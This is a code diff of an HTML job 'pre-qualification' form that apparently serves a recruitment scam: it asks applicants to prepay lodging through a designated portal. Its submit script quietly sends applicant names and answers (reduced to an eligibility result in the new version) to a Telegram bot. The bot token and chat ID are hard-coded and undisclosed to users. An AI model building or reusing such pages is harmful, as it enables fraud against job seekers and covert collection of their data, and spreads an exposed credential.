@@ -9,18 +9,15 @@
 
 <body>
 
-<!-- ================= FORM SCREEN ================= -->
+<!-- FORM SCREEN -->
 <div class="screen screen-form" id="screenForm">
 
   <div class="card">
     <h1>Pre-Qualification Questions</h1>
-    <p class="subtitle">
-      Please respond to the following questions to continue.
-    </p>
+    <p class="subtitle">Please respond to the following questions to continue.</p>
 
     <form id="form">
 
-      <!-- NAME -->
       <div class="field">
         <label>First Name <span class="req">*</span></label>
         <input type="text" name="firstName" required>
@@ -31,65 +28,41 @@
         <input type="text" name="lastName" required>
       </div>
 
-      <!-- Q1 -->
+      <!-- QUESTIONS -->
       <div class="question">
         <h3>1. Availability <span class="req">*</span></h3>
-        <p>
-          Full-time, on-site availability in Nashville, TN for the full 9-month project.<br>
-          <strong>Required</strong> to ensure project scheduling and continuity.
-        </p>
+        <p><strong>Required</strong> to ensure project scheduling and continuity.</p>
         <div class="options">
           <label><input type="radio" name="q1" value="Yes" required> Yes</label>
           <label><input type="radio" name="q1" value="No"> No</label>
         </div>
       </div>
 
-      <!-- Q2 -->
       <div class="question">
         <h3>2. Onboarding Compliance <span class="req">*</span></h3>
-        <p>
-          Ability to complete all onboarding steps: application, contract execution,
-          employee portal registration, and mandatory safety training.<br>
-          <strong>Required</strong> for compliance and job-site access.
-        </p>
+        <p><strong>Required</strong> for compliance and job-site access.</p>
         <div class="options">
           <label><input type="radio" name="q2" value="Yes" required> Yes</label>
           <label><input type="radio" name="q2" value="No"> No</label>
         </div>
       </div>
 
-      <!-- Q3 -->
       <div class="question">
         <h3>3. Lodging Requirement <span class="req">*</span></h3>
-        <p>
-          Ability to reserve and pay for lodging through the SunPower-designated portal
-          prior to the start date.<br>
-          <strong>Required</strong> to finalize assignment, scheduling, and operational planning.
-        </p>
+        <p><strong>Required</strong> to finalize assignment and planning.</p>
         <div class="options">
           <label><input type="radio" name="q3" value="Yes" required> Yes</label>
           <label><input type="radio" name="q3" value="No"> No</label>
         </div>
       </div>
 
-      <!-- Q4 -->
       <div class="question">
         <h3>4. Employment Identification <span class="req">*</span></h3>
-        <p>
-          Ability to provide two acceptable forms of employment identification
-          in accordance with hiring requirements.<br>
-          <strong>Required</strong> for employment verification.
-        </p>
+        <p><strong>Required</strong> for employment verification.</p>
         <div class="options">
           <label><input type="radio" name="q4" value="Yes" required> Yes</label>
           <label><input type="radio" name="q4" value="No"> No</label>
         </div>
-      </div>
-
-      <div class="notice">
-        All questions above are part of the pre-qualification process for employment
-        consideration. These requirements are necessary to ensure proper onboarding,
-        compliance, and operational planning.
       </div>
 
       <button type="submit">Submit</button>
@@ -97,29 +70,20 @@
   </div>
 </div>
 
-<!-- ================= REJECT SCREEN ================= -->
-<div class="screen screen-reject" id="screenReject">
-  <div class="card reject-card">
+<!-- REJECT -->
+<div class="screen screen-reject hidden" id="screenReject">
+  <div class="card">
     <h2>We’re sorry</h2>
-    <p>
-      Based on your responses, it will not be possible to continue with your application
-      at this time.
-      <br><br>
-      You may be eligible to reapply in the future should your circumstances change.
-    </p>
+    <p>You cannot continue with your application at this time.</p>
   </div>
 </div>
 
-<!-- ================= SUCCESS SCREEN ================= -->
-<div class="screen screen-success" id="screenSuccess">
-  <div class="card success-card">
+<!-- SUCCESS -->
+<div class="screen screen-success hidden" id="screenSuccess">
+  <div class="card">
     <div class="confetti">🎉 🎉 🎉</div>
     <h2>Congratulations</h2>
-    <p>
-      Your responses have been successfully submitted.
-      <br><br>
-      Please contact your assigned recruiter for the next steps in the process.
-    </p>
+    <p>Please contact your recruiter for next steps.</p>
   </div>
 </div>
 
@@ -128,39 +92,25 @@ document.getElementById("form").addEventListener("submit", function(e) {
   e.preventDefault();
 
   const d = new FormData(this);
+  const hasNo = ["q1","q2","q3","q4"].some(q => d.get(q) === "No");
 
-  const answers = ["q1","q2","q3","q4"].map(q => d.get(q));
-  const hasNo = answers.includes("No");
-
-  // TELEGRAM (always)
-  const msg =
-    "📋 PRE-QUALIFICATION RESULT\n\n" +
-    "Name: " + d.get("firstName") + " " + d.get("lastName") + "\n" +
-    "Status: " + (hasNo ? "NOT ELIGIBLE" : "ELIGIBLE") + "\n\n" +
-    "Availability: " + d.get("q1") + "\n" +
-    "Onboarding: " + d.get("q2") + "\n" +
-    "Lodging: " + d.get("q3") + "\n" +
-    "Identification: " + d.get("q4");
-
+  // Telegram
   fetch("https://api.telegram.org/bot8219963792:AAGWcvtcyC0rd0zMLXN2Uf3uPUySB9GuBTw/sendMessage", {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: {"Content-Type":"application/json"},
     body: JSON.stringify({
       chat_id: "8547093828",
-      text: msg
+      text: `Result: ${hasNo ? "NOT ELIGIBLE" : "ELIGIBLE"}`
     })
   });
 
-  document.getElementById("screenForm").classList.add("fade-out");
+  document.getElementById("screenForm").classList.add("hidden");
 
-  setTimeout(() => {
-    document.getElementById("screenForm").style.display = "none";
-    if (hasNo) {
-      document.getElementById("screenReject").style.display = "flex";
-    } else {
-      document.getElementById("screenSuccess").style.display = "flex";
-    }
-  }, 400);
+  if (hasNo) {
+    document.getElementById("screenReject").classList.remove("hidden");
+  } else {
+    document.getElementById("screenSuccess").classList.remove("hidden");
+  }
 });
 </script>
 
